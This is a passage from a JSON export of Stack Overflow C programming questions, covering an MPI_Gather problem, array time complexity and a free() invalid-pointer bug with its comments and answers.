sum = 0, j = 0;\n        int my_first_ele = 0, my_last_ele = 0;\n        int a[10][10], v[10], partial_mul[10] = {0}, mul[10] = {0};\n\n        MPI_Init(NULL, NULL);\n        MPI_Comm_rank(MPI_COMM_WORLD, &amp;rank);\n        MPI_Comm_size(MPI_COMM_WORLD, &amp;size);\n\n        if(rank == 0)\n        {\n                printf(\"Enter the row of array A: \");\n                scanf(\"%d\", &amp;a_r);\n                printf(\"Enter the column of array A: \");\n                scanf(\"%d\", &amp;a_c);\n                printf(\"Enter the array A: \");\n\n                for(i = 0; i &lt; a_r; i++)\n                {\n                        for(j = 0; j &lt; a_c; j++)\n                                scanf(\"%d\", &amp;a[i][j]);\n                }\n\n                printf(\"Enter the size of vector array: \");\n                scanf(\"%d\", &amp;v_s);\n                printf(\"Enter the vector array: \");\n                for(i = 0; i &lt; v_s; i++)\n                {\n                        scanf(\"%d\", &amp;v[i]);\n                }\n\n                MPI_Bcast(&amp;a_r, 1, MPI_INT, 0, MPI_COMM_WORLD);\n                MPI_Bcast(&amp;a_c, 1, MPI_INT, 0, MPI_COMM_WORLD);\n                MPI_Bcast(&amp;v_s, 1, MPI_INT, 0, MPI_COMM_WORLD);\n                MPI_Bcast(a, a_r*a_c, MPI_INT, 0, MPI_COMM_WORLD);\n                MPI_Bcast(v, v_s, MPI_INT, 0, MPI_COMM_WORLD);\n\n                local_row = a_r / size;\n                my_first_ele = rank * local_row;\n                my_last_ele = (rank+1) * local_row;\n\n                if(a_c == v_s)\n                {      \n                        for(i = my_first_ele; i &lt; my_last_ele; i++)\n                        {\n                                for(j = 0; j &lt; a_c; j++)\n                                {\n                                        partial_mul[i] = partial_mul[i] + (a[i][j]*v[j]);\n                                }\n                        }\n                        printf(\"\\nPartial multiplication in Rank 0: \\n\");\n                        for(i = my_first_ele; i &lt; my_last_ele; i++)\n                                printf(\"%d \\n\", partial_mul[i]);\n\n                        MPI_Gather(partial_mul, local_row, MPI_INT, mul, local_row, MPI_INT, 0, MPI_COMM_WORLD);\n\n                        printf(\"\\n \\nGlobal Multiplication: \\n\");\n                        for(i = 0; i &lt; a_r; i++)\n                        {\n                                printf(\"%d \\n\", mul[i]);\n                        }\n                }\n                else\n                        printf(\"\\nCan't multiply. \\n\");\n        }\n\n        else\n        {\n                MPI_Bcast(&amp;a_r, 1, MPI_INT, 0, MPI_COMM_WORLD);\n                MPI_Bcast(&amp;a_c, 1, MPI_INT, 0, MPI_COMM_WORLD);\n                MPI_Bcast(&amp;v_s, 1, MPI_INT, 0, MPI_COMM_WORLD);\n                MPI_Bcast(a, a_r*a_c, MPI_INT, 0, MPI_COMM_WORLD);\n                MPI_Bcast(v, v_s, MPI_INT, 0, MPI_COMM_WORLD);\n\n                local_row = a_r / size;\n                my_first_ele = rank * local_row;\n                my_last_ele = (rank+1) * local_row;\n                if(a_c == v_s)\n                {     \n                        for(i = my_first_ele; i &lt; my_last_ele; i++)\n                        {\n                                for(j = 0; j &lt; a_c; j++)\n                                {\n                                        partial_mul[i] = partial_mul[i] + (a[i][j]*v[j]);\n                                }\n                        }\n                        printf(\"\\nPartial multiplication in Rank %d: \\n\", rank);\n                        for(i = my_first_ele; i &lt; my_last_ele; i++)\n                                printf(\"%d \\n\", partial_mul[i]);\n\n                        MPI_Gather(partial_mul, local_row, MPI_INT, mul, local_row, MPI_INT, 0, MPI_COMM_WORLD);\n\n                }\n                else\n                        printf(\"\\nCan't multiply. \\n\");\n        }\n        MPI_FINALIZE();\n}\n</code></pre>\n\n<p>I have a problem with above code. My partial multiplication value is correct. But in my overall multiplication I can only gather rank 0 elements, rest of the values are being printed as 0. What is the problem can anyone explain.</p>\n"}, {"tags": ["c", "arrays", "multidimensional-array", "time", "time-complexity"], "comments": [{"owner": {"reputation": 4418, "user_id": 5264388, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/160f1b756f3f4a0ba9a2a58f4cce911b?s=128&d=identicon&r=PG", "display_name": "owacoder", "link": "https://stackoverflow.com/users/5264388/owacoder"}, "edited": false, "score": 2, "creation_date": 1459358888, "post_id": 36315680, "comment_id": 60254736, "body": "The inner loop is run <code>n</code> times, and the contents of the inner loop will be executed <code>n</code> times, thus the content of the inner loop will execute <code>n*n</code> = <code>n to the power of 2</code> times."}, {"owner": {"reputation": 16376, "user_id": 2009616, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/oiCJA.jpg?s=128&g=1", "display_name": "isedev", "link": "https://stackoverflow.com/users/2009616/isedev"}, "edited": false, "score": 0, "creation_date": 1459358900, "post_id": 36315680, "comment_id": 60254746, "body": "you are processing all of the elements of one array (<code>n</code> elements) for each element of the other array (<code>n</code> elements). <code>n * n = n ^ 2</code>."}, {"owner": {"reputation": 408, "user_id": 6094551, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Fz1lEdMMVAw/AAAAAAAAAAI/AAAAAAAAASw/RwgU7Mo_U6Q/photo.jpg?sz=128", "display_name": "Asier S&#225;nchez Rodr&#237;guez", "link": "https://stackoverflow.com/users/6094551/asier-s%c3%a1nchez-rodr%c3%adguez"}, "edited": false, "score": 0, "creation_date": 1459358981, "post_id": 36315680, "comment_id": 60254791, "body": "in memory not always have to be the same,  and depending on hoy they are can have very different access costs"}, {"owner": {"reputation": 33, "user_id": 6024959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1aac5e39cca3519a5baa2ddad311be02?s=128&d=identicon&r=PG&f=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/6024959/vishal"}, "reply_to_user": {"reputation": 4418, "user_id": 5264388, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/160f1b756f3f4a0ba9a2a58f4cce911b?s=128&d=identicon&r=PG", "display_name": "owacoder", "link": "https://stackoverflow.com/users/5264388/owacoder"}, "edited": false, "score": 0, "creation_date": 1459409770, "post_id": 36315680, "comment_id": 60276400, "body": "@owacoder I understand that, but since a one-dimensional and two-dimensional array store the elements in the same manner, two dimensional array can be thought of a one-dimensional array with large size. Anyhow I understood the point made by Haris. Thank you"}], "answers": [{"tags": [], "owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "is_accepted": true, "score": 1, "last_activity_date": 1459358990, "creation_date": 1459358990, "answer_id": 36315754, "question_id": 36315680, "link": "https://stackoverflow.com/questions/36315680/time-complexity-of-one-dimensional-and-two-dimensional-arrays/36315754#36315754", "title": "Time complexity of one dimensional and two dimensional arrays", "body": "<p>The difference in the time complexity is because of the number of elements you are storing.</p>\n\n<p>For a linear 1D array, you are storing <code>n</code> elements in a linear way, and it is getting stored in a linear way too. So time complexity is <code>O(n)</code></p>\n\n<p>For a 2D array, lets suppose you are storing <code>m</code> elements, which are actually stored in a linear way only in the memory. But, what you work with are the elements divided into rows (and columns). Now for instance, the size of each row and column is <code>n</code>, then you are reading <code>n*n</code> elements, which is nothing but <code>m</code> elements only (<code>m == n*n</code>). So the complexity is <code>O(m)</code> or <code>O(n^2)</code></p>\n"}, {"tags": [], "owner": {"reputation": 13530, "user_id": 593382, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/f7326fd554e09edf21ca727d6854e22e?s=128&d=identicon&r=PG", "display_name": "Grady Player", "link": "https://stackoverflow.com/users/593382/grady-player"}, "is_accepted": false, "score": 1, "last_activity_date": 1459360169, "creation_date": 1459360169, "answer_id": 36316100, "question_id": 36315680, "link": "https://stackoverflow.com/questions/36315680/time-complexity-of-one-dimensional-and-two-dimensional-arrays/36316100#36316100", "title": "Time complexity of one dimensional and two dimensional arrays", "body": "<p>sort of a perceptual issue, since if you have n elements it would be O(n) either way, but if you are measuring based on one of the array dimensions you aren't going to be n^2 unless it is a square matrix (I see that yours is)... so better to think of it as O(h*w) or just 0(n) anyway... </p>\n"}], "owner": {"reputation": 33, "user_id": 6024959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1aac5e39cca3519a5baa2ddad311be02?s=128&d=identicon&r=PG&f=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/6024959/vishal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2606, "favorite_count": 0, "accepted_answer_id": 36315754, "answer_count": 2, "score": 0, "last_activity_date": 1459360169, "creation_date": 1459358719, "last_edit_date": 1459359243, "question_id": 36315680, "link": "https://stackoverflow.com/questions/36315680/time-complexity-of-one-dimensional-and-two-dimensional-arrays", "title": "Time complexity of one dimensional and two dimensional arrays", "body": "<p>Take for example taking input from the user for a one-dimensional array of size n, we know it's time complexity is O(n).</p>\n\n<pre><code>for(i=0;i&lt;n;i=i+1)\n     {\n         scanf(\"%d\",&amp;a[i]);\n     }\n</code></pre>\n\n<p>Now if the array is two dimensional, the time complexity is O(n^2)</p>\n\n<pre><code>for(i=0;i&lt;n;i=i+1)\n{\n   for(j=0;j&lt;n;j=j+1)\n   {\n       scanf(\"%d\",&amp;a[i][j]);\n   }\n}\n</code></pre>\n\n<p>But even the two dimensional array is saved in the same manner as the one-dimensional array. It is essentially just an increase in size, why is there a difference?</p>\n"}, {"tags": ["c", "pointers", "malloc", "free", "realloc"], "comments": [{"owner": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1459358071, "post_id": 36315369, "comment_id": 60254295, "body": "Variable names that have no documentation value make kittens cry. <code>j</code>? <code>t</code>? Ok, easy enough to figure them out when taking time to read the code but you can make it easier with reasonable naming. Even if you don&#39;t care to make it easier for yourself, when you&#39;re asking other people to help with your problem without compensation, you owe it to them to make the task as simple for them as possible. Beyond that, your output does not seem to match the program you provided; there are what appear to be pointer values before each string which your code as shown doesn&#39;t print."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1459358154, "post_id": 36315369, "comment_id": 60254350, "body": "These statements created problem while freeing - <code>buf[len++] = ch;</code> . As you change to what the pointer points to ."}, {"owner": {"reputation": 26680, "user_id": 1806780, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/NCB41.jpg?s=128&g=1", "display_name": "Sami Kuhmonen", "link": "https://stackoverflow.com/users/1806780/sami-kuhmonen"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 2, "creation_date": 1459358293, "post_id": 36315369, "comment_id": 60254429, "body": "@ameyCU Umm, no, that doesn&#39;t change any pointers in any way"}, {"owner": {"reputation": 36985, "user_id": 749284, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9939c97c2ccc2f1f6b829e9afbc32e5b?s=128&d=identicon&r=PG", "display_name": "mah", "link": "https://stackoverflow.com/users/749284/mah"}, "edited": false, "score": 0, "creation_date": 1459358295, "post_id": 36315369, "comment_id": 60254430, "body": "There&#39;s also a break statement that should probably be in <code>case &#39;\\n&#39;</code>. If you intend for code to flow through the next without a break, you really want to put a comment there to indicate it."}, {"owner": {"reputation": 3111, "user_id": 479941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ebad9df474aa1949c09ef5136e55fd33?s=128&d=identicon&r=PG", "display_name": "Mark Nunberg", "link": "https://stackoverflow.com/users/479941/mark-nunberg"}, "edited": false, "score": 0, "creation_date": 1459358333, "post_id": 36315369, "comment_id": 60254451, "body": "Allocation size is 9 because of the embedded <code>NUL</code> in C strings"}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 26680, "user_id": 1806780, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/NCB41.jpg?s=128&g=1", "display_name": "Sami Kuhmonen", "link": "https://stackoverflow.com/users/1806780/sami-kuhmonen"}, "edited": false, "score": 0, "creation_date": 1459358392, "post_id": 36315369, "comment_id": 60254487, "body": "@SamiKuhmonen ohh yes ,  mixed up <code>bufs</code> with <code>buf</code> ."}, {"owner": {"reputation": 546, "user_id": 3841908, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19338e6e4ad8a9f1772c2bd9122ca04c?s=128&d=identicon&r=PG&f=1", "display_name": "Markus Dheus", "link": "https://stackoverflow.com/users/3841908/markus-dheus"}, "edited": false, "score": 0, "creation_date": 1459358653, "post_id": 36315369, "comment_id": 60254627, "body": "It seems that the final bufs[j]=0 writes past what is allocated for bufs. Imagine in the last pass through the loop  j is 10. You then reallocate bufs to hold 11 char pointers and increment j. J is now 11. bufs[11] now writes to the 12th element of an array that can hold only 11 elements."}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1459359013, "post_id": 36315369, "comment_id": 60254809, "body": "You always need at least 1 <code>char *</code> for the terminating null pointer, so you might as well initialize <code>char** bufs = malloc(sizeof(char*));</code> and change the realloc to <code>bufs = realloc(bufs, (j+2)*sizeof(char*));</code>."}], "answers": [{"comments": [{"owner": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459359833, "post_id": 36315643, "comment_id": 60255246, "body": "If I take bufs[j] = 0 off the error is:                                                       0x1a14030 HOME 0x1a14050 2 0x1a14070 A 0x1a14010 8 0x1a140c0 D 0x21                                                                                                           Segmentation Fault"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459359955, "post_id": 36315643, "comment_id": 60255328, "body": "You must allocate one more element than you do. <code>realloc(bufs, (j+2)*sizeof(char*))</code>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459360034, "post_id": 36315643, "comment_id": 60255377, "body": "You must also <code>free(filter)</code> after the loop freeing its elements."}, {"owner": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459360056, "post_id": 36315643, "comment_id": 60255393, "body": "usually where someone uses malloc or realloc they let a little space null, and I&#39;ve always used this to break for and while cycles, but in this sample code it doesn&#39;t work"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459360091, "post_id": 36315643, "comment_id": 60255418, "body": "As I wrote, you have not allocated enough memory."}, {"owner": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459360117, "post_id": 36315643, "comment_id": 60255430, "body": "Ehi @Weather Vane I didn&#39;t use it (free(filter)) in this case because it faults before the end of the cycle ;)"}, {"owner": {"reputation": 124, "user_id": 5028456, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cfc2891061dec169386d1b5fba5ef068?s=128&d=identicon&r=PG&f=1", "display_name": "hwibell", "link": "https://stackoverflow.com/users/5028456/hwibell"}, "reply_to_user": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459360288, "post_id": 36315643, "comment_id": 60255521, "body": "@JoAccount If you take out bufs[j] = 0, you will need to change the way you are checking for the end of the array. Instead of removing bufs[j] = 0, you can realloc bufs to increase the size of bufs by 1 to fit the sentinel value. This can be done by adding bufs = realloc(bufs, (j+1)*sizeof(char*)); before bufs[j] = 0;"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1459360355, "post_id": 36315643, "comment_id": 60255568, "body": "The first time <code>realloc</code> is called it must be for <i>two</i> array elements: one for the value returned by <code>strdup</code> and one for the <code>NULL</code> sentinel you use instead of a length count. Ditto subsequently, for further items."}, {"owner": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459360394, "post_id": 36315643, "comment_id": 60255586, "body": "I&#39;ve added a new realloc(bufs, j+1*sizeof(char*)) without bufs[j] = 0 before return bufs and it works, but it&#39;s strange because many other times similar programs worked well. Is it possible that this likely thing appeared because the machine onto I wrote this is a new 64 bit while I always used 32 bit machines?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1459360471, "post_id": 36315643, "comment_id": 60255636, "body": "It might have &quot;worked&quot; before because <code>realloc</code> and friends may allocate <i>more</i> memory than requested, making the <i>undefined behaviour</i> benign."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1459360567, "post_id": 36315643, "comment_id": 60255703, "body": "You don&#39;t need <i>another</i> <code>realloc</code>, you just need to ask for one more than you do. <code>realloc(bufs, (j+2)*sizeof(char*))</code>"}, {"owner": {"reputation": 124, "user_id": 5028456, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cfc2891061dec169386d1b5fba5ef068?s=128&d=identicon&r=PG&f=1", "display_name": "hwibell", "link": "https://stackoverflow.com/users/5028456/hwibell"}, "reply_to_user": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459360608, "post_id": 36315643, "comment_id": 60255735, "body": "@JoAccount: Writing beyond the allocated memory is undefined. It is not recommended to rely on such behavior even if it worked in other cases."}, {"owner": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459360832, "post_id": 36315643, "comment_id": 60255885, "body": "I&#39;ve to realloc((j+2)*sizeof(char*)) one time or in the cycle?"}, {"owner": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459361242, "post_id": 36315643, "comment_id": 60256144, "body": "If I put realloc(bufs, (j+2)*sizeof(char*)) in the cycle it allocates a space that is the double of what I need. Where have I to put it?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1459361342, "post_id": 36315643, "comment_id": 60256219, "body": "Make ONE change only. Change the <code>1</code> in <code>realloc(bufs, (j+1)*sizeof(char*))</code> to a <code>2</code>. End of. It does not allocate double what you need: that&#39;s a <code>j+2</code> not <code>j*2</code>. It allocates one extra element for the <code>NULL</code>."}, {"owner": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "edited": false, "score": 0, "creation_date": 1459363891, "post_id": 36315643, "comment_id": 60257945, "body": "Sorry if I did get confused, That&#39;s my code of course"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1459363946, "post_id": 36315643, "comment_id": 60257971, "body": "If one of these answers solved your problem, please &quot;accept&quot; it."}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 7, "last_activity_date": 1459358598, "creation_date": 1459358598, "answer_id": 36315643, "question_id": 36315369, "link": "https://stackoverflow.com/questions/36315369/strange-free-invalid-pointer-c/36315643#36315643", "title": "strange free() invalid pointer C", "body": "<p>The first time these lines are executed</p>\n\n<pre><code>bufs = realloc(bufs, (j+1)*sizeof(char*));\nbufs[j++] = strndup(buf,len);\n</code></pre>\n\n<p>you obtain memory for 1 pointer (j was 0). This leaves no space for the closing <code>NULL</code> you write at the end of the function with</p>\n\n<pre><code>bufs[j] = 0;\n</code></pre>\n\n<p>so you are writing beyond the allocated memory, thus have <em>undefined behaviour</em>. Similarly each time you extend the buffer length.</p>\n"}, {"tags": [], "owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "is_accepted": false, "score": 6, "last_activity_date": 1459358609, "creation_date": 1459358609, "answer_id": 36315648, "question_id": 36315369, "link": "https://stackoverflow.com/questions/36315369/strange-free-invalid-pointer-c/36315648#36315648", "title": "strange free() invalid pointer C", "body": "<p>Your <code>bufs[j] = 0;</code> at the end of <code>read_and_filter</code> writes into non-allocated memory. You never <code>realloc</code>-ed your <code>bufs</code> for that extra <code>0</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 192, "user_id": 5947477, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NkNmP.jpg?s=128&g=1", "display_name": "anita2R", "link": "https://stackoverflow.com/users/5947477/anita2r"}, "is_accepted": false, "score": 0, "last_activity_date": 1459364024, "creation_date": 1459364024, "answer_id": 36317351, "question_id": 36315369, "link": "https://stackoverflow.com/questions/36315369/strange-free-invalid-pointer-c/36317351#36317351", "title": "strange free() invalid pointer C", "body": "<p>Memory leak is occurring from two places - strdup and the realloc</p>\n\n<p>One answer is to make an initial allocation of memory for the buffer in main, using malloc and then pass a pointer to the allocated memory to the function. The function can then realloc the buffer, and copy data into it.</p>\n\n<p>On return from the function, main can access the data directly from the buffer as it has a valid pointer to it, and then can free that memory before closing.</p>\n\n<p>According to valgrind, the following has no memory loss.    </p>\n\n<pre><code>void read_and_filter(int fd, char **bufs) {\n  char buf[100];\n  char ch;\n  int j = 0, len = 0, t = 0;\n  while (!t &amp;&amp; read(fd,&amp;ch,1) == 1) {\n    switch (ch) {\n    case '\\n':\n      t = 1;\n    case ' ':\n      *bufs = realloc(*bufs, (j + 2)*sizeof(char*));\n      strncpy(bufs[j++], buf, len);\n      memset(buf,0,len);\n      len = 0;\n      break;\n    default:\n      buf[len++] = ch;\n    }\n  }\n  bufs[j] = 0;\n  return;\n}\n\nint main(int argc, char **argv) {\n  char *bptr = malloc(1);\n  int fd = open(\"input.txt\", O_RDONLY);\n\n  read_and_filter(fd, &amp;bptr);\n\n  printf(\"%s\\n\", bptr);\n  free(bptr);\n  return 0;\n</code></pre>\n\n<p>However I cannot be sure that this fully replicates the OP's intended functionality, but the overall approach does deal with the memory issues.</p>\n"}], "owner": {"reputation": 57, "user_id": 5738739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/48f13f0dbaacc0e0203d7b93b791f61b?s=128&d=identicon&r=PG&f=1", "display_name": "JoAccount", "link": "https://stackoverflow.com/users/5738739/joaccount"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1380, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1459364024, "creation_date": 1459357713, "question_id": 36315369, "link": "https://stackoverflow.com/questions/36315369/strange-free-invalid-pointer-c", "title": "strange free() invalid pointer C", "body": "<p>I have a problem with this piece of code that I modified many times (but the error always appeared):\nIt seems it has an error in freeing the last index of \"filter\"</p>\n\n<pre><code>char** read_and_filter(int fd) {\n  char buf[MAXLENGTH];\n  char **bufs=NULL;\n  char ch;\n  int j = 0, len = 0, t = 0;\n  while (!t &amp;&amp; read(fd,&amp;ch,1) == 1) {\n    switch (ch) {\n    case '\\n':\n      t = 1;\n    case ' ':\n      bufs = realloc(bufs, (j+1)*sizeof(char*));\n      bufs[j++] = strndup(buf,len);\n      memset(buf,0,len);\n      len = 0;\n      break;\n    default:\n      buf[len++] = ch;\n    }\n  }\n  bufs[j] = 0;\n  return bufs;\n}\n\nint main(int argc, char **argv) {\n  char **filter;\n  int i,fd = open(\"input.txt\",O_RDONLY);\n  filter = read_and_filter(fd);\n  for(i = 0; filter[i]; i++) {\n    printf(\"%s\\n\",filter[i]);\n    free(filter[i]);\n  }\n  return 0;\n}\n</code></pre>\n\n<p>Here is the output:</p>\n\n<pre><code>0x1521030\nHOME\n0x1521050\n2\n0x1521070\nA\n0x1521010\n8\n0x15210c0\nD\n*** Error in `./test': free(): invalid pointer: 0x00000000015210c0 ***\n</code></pre>\n\n<p>I also tried to debug it with valgrind (it says me that the allocator tries to free 9 byte while the sum of characters is 8, strange no?) and gdb but nothing worked.\nThe first line of input.txt is \"HOME 2 A 8 D\\n\"</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 1, "creation_date": 1459358959, "post_id": 36315080, "comment_id": 60254774, "body": "RTFM: call <code>srand()</code> <i>once</i>, and only once, in your program."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 